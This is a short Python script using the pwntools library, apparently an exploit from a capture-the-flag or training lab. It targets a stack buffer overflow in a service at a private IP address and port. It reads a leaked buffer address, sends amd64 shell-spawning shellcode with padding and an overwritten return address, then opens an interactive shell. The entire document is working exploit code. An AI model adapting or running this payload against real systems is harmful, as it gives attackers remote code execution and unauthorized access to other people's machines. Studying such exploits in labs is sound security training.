from pwn import *

p = remote('10.10.7.194', 9004)
p.recv()
output = p.recv()
shellcode= asm(shellcraft.amd64.sh(), arch='amd64')
address = int(output.split(b"at")[1].strip().decode("utf-8"),16)
payload = shellcode + b"A"*(80 - len(shellcode)) + b"B"*8 + p64(address)
p.sendline(payload)
p.interactive()
